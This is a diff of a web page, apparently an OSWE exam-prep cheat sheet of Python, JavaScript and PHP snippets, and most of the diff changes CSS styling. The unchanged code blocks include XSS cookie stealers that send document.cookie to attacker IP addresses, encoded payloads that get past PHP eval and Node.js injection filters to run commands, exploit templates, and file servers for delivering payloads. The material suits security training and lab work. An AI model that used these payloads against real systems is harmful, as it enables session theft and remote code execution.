@@ -15,35 +15,30 @@ permalink: /python-code-snippets/
 <style>
   /* klisé-inspired variables (dark theme). Tweak these to match the theme precisely */
   :root{
-    /* klisé-like palette (dark, muted blue/teal accents) */
-    --bg: #071026;           /* page background */
-    --panel: #0a1324;        /* panels / cards */
-    --muted: #9aa6bd;        /* muted text */
-    --text: #e6f0ff;         /* primary text */
-    --accent: #6ad1ff;       /* primary accent (links, title) */
-    --accent-2: #9be7a3;     /* secondary accent (headings) */
-    --code-bg: #071020;      /* code block background */
-    --border: rgba(255,255,255,0.06);
-    --tile-border: rgba(255,255,255,0.04);
-    --glass: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.00));
+    --bg: #0a0a0a;
+    --panel: #151515;
+    --muted: #a1a1a1;
+    --text: #d4d4d4;
+    --accent: #fb923c;
+    --accent-2: #ffffff;
+    --code-bg: #050505;
+    --border: rgba(255,255,255,0.1);
   }
 
-  /* Page container */
+  /* Container and typography */
   .oswe-container{
     background: var(--bg);
     color: var(--text);
     font-family: Inter, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
     padding: 28px;
     line-height: 1.6;
-    border-radius: 12px;
-    box-shadow: 0 10px 30px rgba(2,6,23,0.6);
-    max-width: 1100px;
-    margin: 24px auto;
+    border-radius: 8px;
+    box-shadow: 0 6px 24px rgba(2,6,23,0.6);
   }
 
   .oswe-title{
     color: var(--accent);
-    margin: 0 0 6px 0;
+    margin: 0 0 8px 0;
     font-size: 1.9rem;
     letter-spacing: -0.5px;
   }
@@ -56,10 +51,10 @@ permalink: /python-code-snippets/
 
   /* TOC */
   .oswe-toc{
-    background: var(--glass);
+    background: linear-gradient(180deg, rgba(255,255,255,0.01), rgba(255,255,255,0.0));
     border: 1px solid var(--border);
     padding: 14px;
-    border-radius: 10px;
+    border-radius: 8px;
     margin-bottom: 18px;
   }
   .oswe-toc a{ color: var(--accent); text-decoration: none; }
@@ -76,13 +71,7 @@ permalink: /python-code-snippets/
 
   /* Paragraphs & lists */
   p, li, pre, code { color: var(--text); }
-  code.inline {
-    background: rgba(255,255,255,0.03);
-    padding: 2px 6px;
-    border-radius: 6px;
-    font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", "Courier New", monospace;
-    font-size: .95em;
-  }
+  code.inline { background: rgba(255,255,255,0.03); padding: 2px 6px; border-radius: 4px; font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", "Courier New", monospace; font-size: .95em; }
   ul { margin-left: 1.1rem; }
 
   /* Panels */
@@ -90,62 +79,23 @@ permalink: /python-code-snippets/
     background: var(--panel);
     border: 1px solid var(--border);
     padding: 12px;
-    border-radius: 10px;
+    border-radius: 8px;
     margin: 10px 0;
   }
 
   /* Code blocks (Prism theme file included above) */
   pre[class*="language-"] {
     background: var(--code-bg) !important;
-    border-radius: 12px;
-    padding: 18px;
+    border-radius: 8px;
+    padding: 14px;
     overflow: auto;
-    margin: 18px 0;
-    border: 1px solid var(--tile-border);
-    box-shadow: inset 0 -10px 40px rgba(0,0,0,0.55);
+    margin: 14px 0;
+    border: 1px solid rgba(255,255,255,0.04);
+    box-shadow: inset 0 -10px 50px rgba(0,0,0,0.6);
     font-size: 0.95rem;
-    color: var(--text);
-    /* Make code blocks visually square "tiles" */
-    width: 100%;
-    max-width: 900px;          /* limit how wide the square grows on large screens */
-    aspect-ratio: 1 / 1;       /* enforce square ratio */
-    min-height: 320px;         /* ensure comfortable height on small screens */
-    display: block;
-    position: relative;
-    line-height: 1.45;
-    /* allow inner content to scroll if it overflows */
-    overflow: auto;
   }
-
-  /* If you prefer taller tiles on very small screens, this tweak helps */
-  @media (max-width: 700px) {
-    pre[class*="language-"] {
-      aspect-ratio: auto;   /* disable strict square on narrow devices */
-      min-height: 420px;
-    }
-  }
-
-  /* Make code fonts a little larger for readability and use a nice monospace */
-  pre code {
-    font-family: "Fira Code", "JetBrains Mono", ui-monospace, SFMono-Regular, Menlo, Monaco, monospace;
-    font-size: 0.95rem;
-    tab-size: 4;
-    white-space: pre; /* preserve spacing */
-  }
-
-  /* Add a small label in the top-left of each code tile (optional) */
-  pre[class*="language-"]::before {
-    content: attr(data-lang);
-    position: absolute;
-    top: 10px;
-    left: 14px;
-    font-size: 0.75rem;
-    color: var(--muted);
-    background: rgba(255,255,255,0.02);
-    padding: 4px 8px;
-    border-radius: 6px;
-    border: 1px solid rgba(255,255,255,0.03);
-  }
+  /* Make code fonts a little larger for readability */
+  pre code { font-family: "Fira Code", "JetBrains Mono", ui-monospace, SFMono-Regular, Menlo, Monaco, monospace; }
 
   /* small helper styles */
   .muted { color: var(--muted); font-size: .95rem; }
@@ -235,17 +185,17 @@ permalink: /python-code-snippets/
 
   <h3 id="MySQL">MySQL</h3>
   <p>Login to the MySQL instance and check out the <code class="inline">general_log</code> and values, whether it is set to ON or OFF:</p>
-  <pre class="language-sql" data-lang="SQL"><code>show variables like '%log%';</code></pre>
+  <pre><code class="language-sql">show variables like '%log%';</code></pre>
 
   <p>If it's OFF, run as root:</p>
-  <pre class="language-sql" data-lang="SQL"><code>SET GLOBAL general_log = 1;</code></pre>
+  <pre><code class="language-sql">SET GLOBAL general_log = 1;</code></pre>
 
   <p>Then check <code class="inline">general_log_file</code> to find where logs are written.</p>
 
   <h2 id="Python-Code-Snippets">Python Code Snippets</h2>
 
   <h3 id="Starting-Template">Starting Template</h3>
-  <pre class="language-python" data-lang="Python"><code>import requests
+  <pre><code class="language-python">import requests
 import string
 import re
 import threading
@@ -300,12 +250,12 @@ if __name__ == "__main__":
     # Main Logic
 
     username, password = register()
-    usercookies = login(username, password)</code></pre>
+    usercookies = login(username, password) </code></pre>
 
   <hr />
 
   <h3 id="File-Upload">File Upload With Additional Parameters</h3>
-  <pre class="language-python" data-lang="Python"><code>def uploadFile(phpsessid):
+  <pre><code class="language-python">def uploadFile(phpsessid):
 
     url = "http://10.100.102.73:80/item/updateItem.php"
 
@@ -343,7 +293,7 @@ if __name__ == "__main__":
   <hr />
 
   <h3 id="HTTP-File-Server">HTTP File Server 1</h3>
-  <pre class="language-python" data-lang="Python"><code>from http.server import BaseHTTPRequestHandler
+  <pre><code class="language-python">from http.server import BaseHTTPRequestHandler
 from http.server import HTTPServer
 
 LHOST      = "10.0.0.1"
@@ -370,7 +320,7 @@ def start_web_server():
 start_web_server()</code></pre>
 
   <h4>HTTP File Server 2</h4>
-  <pre class="language-python" data-lang="Python"><code>from http.server import BaseHTTPRequestHandler, HTTPServer
+  <pre><code class="language-python">from http.server import BaseHTTPRequestHandler, HTTPServer
 import threading
 import os
 
@@ -407,7 +357,7 @@ def start_web_server(host="192.168.45.249", port=80, directory="."):
     return httpd</code></pre>
 
   <h4>HTTP File Server 3</h4>
-  <pre class="language-python" data-lang="Python"><code>import threading
+  <pre><code class="language-python">import threading
 import mimetypes
 
 HOST = '0.0.0.0'
@@ -481,7 +431,7 @@ server_thread.start()
 print(f"{success} File server started in background. Main program running...")</code></pre>
 
   <h3 id="XSS-Cookies-Stealer">XSS Cookies Stealer</h3>
-  <pre class="language-python" data-lang="Python"><code>def send_xss_payload():
+  <pre><code class="language-python">def send_xss_payload():
 
     payload = "&lt;script&gt;document.location='http://10.100.102.67:9001/?c='+document.cookie&lt;/script&gt;"
     data = {
@@ -557,7 +507,7 @@ listen_for_cookies()</code></pre>
 
   <h4 id="Search-for-Deserialization-Methods">Search for Deserialization Methods</h4>
   <p>Use code analysis tools (grep, IDE search, SonarQube) to find calls to the methods listed above.</p>
-  <pre class="language-bash" data-lang="Bash"><code>grep -r "readObject" .
+  <pre><code class="language-bash">grep -r "readObject" .
 grep -r "XStream\.fromXML" .
 grep -r --include="*.java" -E '(ObjectInputStream\.readObject\(|ObjectInputStream\.readUnshared\(|readResolve\(|defaultReadObject\(|XMLDecoder|XStream\.fromXML\(|ObjectMapper\.readValue\(|Kryo\.readObject\(|Kryo\.readClassAndObject\(|Yaml\.load\(|HessianInput\.readObject\()' .</code></pre>
 
@@ -566,7 +516,7 @@ grep -r --include="*.java" -E '(ObjectInputStream\.readObject\(|ObjectInputStrea
 
   <h4 id="Check-for-Validation-or-Whitelisting">Check for Validation or Whitelisting</h4>
   <p>Look for <code>ObjectInputFilter</code> or similar filters. Example:</p>
-  <pre class="language-java" data-lang="Java"><code>ObjectInputFilter filter = ObjectInputFilter.Config.createFilter("allowed.package.*;!*");
+  <pre><code class="language-java">ObjectInputFilter filter = ObjectInputFilter.Config.createFilter("allowed.package.*;!*");
 ObjectInputStream ois = new ObjectInputStream(input);
 ois.setObjectInputFilter(filter);</code></pre>
 
@@ -575,12 +525,12 @@ ois.setObjectInputFilter(filter);</code></pre>
 
   <h2 id="Regex-Cheetsheet">Regex Cheetsheet</h2>
   <p>Match a START and END delimeter in <code>r.text</code>:</p>
-  <pre class="language-python" data-lang="Python"><code>r = requests.post(target, headers=headers, data=xml, proxies=proxies)
+  <pre><code class="language-python">r = requests.post(target, headers=headers, data=xml, proxies=proxies)
 match = re.search(f'{re.escape("START DELIMETER")}(.*?){re.escape("END DELIMETER")}', r.text, re.DOTALL)
 print(match[1].strip())</code></pre>
 
   <p>Extract a cookie value from response headers:</p>
-  <pre class="language-python" data-lang="Python"><code>r = requests.post(target, headers=headers, data=xml, proxies=proxies)
+  <pre><code class="language-python">r = requests.post(target, headers=headers, data=xml, proxies=proxies)
 set_cookie = r.headers.get('Set-Cookie', '')
 match = re.search(r'JSESSIONID=([A-Za-z0-9]+);', set_cookie)
 print(match.group(1))</code></pre>
@@ -605,7 +555,7 @@ print(match.group(1))</code></pre>
   </ul>
 
   <h3 id="Leverage-XSS-to-CSRF">Leverage XSS to CSRF</h3>
-  <pre class="language-javascript" data-lang="JavaScript"><code>var req = new XMLHttpRequest();
+  <pre><code class="language-javascript">var req = new XMLHttpRequest();
 req.onload = handleResponse;
 req.open('get','/my-account',true);
 req.send();
@@ -617,7 +567,7 @@ function handleResponse() {
 };</code></pre>
 
   <h3 id="XSS-Cookies-Stealer-js">Filter cookie & send</h3>
-  <pre class="language-javascript" data-lang="JavaScript"><code>function getCookieValue(name) {
+  <pre><code class="language-javascript">function getCookieValue(name) {
     const cookieString = document.cookie;
     const cookies = cookieString.split('; ');
     for (let cookie of cookies) {
@@ -634,11 +584,11 @@ req2.open('GET', 'http://192.168.45.163/' + (cookieValue || ''), false);
 req2.send();</code></pre>
 
   <h2 id="Bypass-PHP-Eval-Filtering">Bypass PHP Eval Filtering</h2>
-  <pre class="language-php" data-lang="PHP"><code>get_defined_functions()['internal'][array_search(urldecode("%65%78%65%63"), get_defined_functions()['internal'])]("whoami");
+  <pre><code class="language-php">get_defined_functions()['internal'][array_search(urldecode("%65%78%65%63"), get_defined_functions()['internal'])]("whoami");
 (new ReflectionFunction(hex2bin("65786563")))->invoke('hostname');</code></pre>
 
   <h2 id="Bypass-Javascript-Injection-Filters">Bypass Javascript Injection Filters</h2>
-  <pre class="language-javascript" data-lang="JavaScript"><code>(function(){module.constructor._load(Buffer.from('6368696c645f70726f63657373','hex').toString()).execSync('ping -c 2');})(); //" 
+  <pre><code class="language-javascript">(function(){module.constructor._load(Buffer.from('6368696c645f70726f63657373','hex').toString()).execSync('ping -c 2');})(); //" 
 (function(){module.constructor._load(String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115)).execSync('ping -c 2');})();//"</code></pre>
 
   <h2 id="YSOSerial-Payload-Creation">YSOSerial</h2>
